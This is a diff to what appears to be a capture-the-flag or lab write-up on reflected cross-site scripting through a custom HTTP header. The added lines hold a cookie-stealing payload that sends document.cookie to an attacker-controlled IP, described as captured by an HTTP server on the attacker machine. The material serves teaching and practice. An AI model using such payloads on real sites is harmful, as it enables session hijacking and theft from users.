@@ -83,3 +83,11 @@ No XSS payloads worked, so a random header was added, and its value was reflecte
 <script>alert(10)</script>
 ```
 A simple XSS payload (<script>alert(10)</script>) was inserted into the custom header and was reflected in the page.
+
+<img width="869" height="170" alt="image" src="https://github.com/user-attachments/assets/160a799a-fbb0-4181-bbd9-7bc5691396ee" />
+
+```
+<svg onload="new Image().src='http://10.10.14.107/?c='+document.cookie">
+```
+
+An HTTP server was started on the attacker machine, and a cookie-stealing payload was inserted into the custom header.
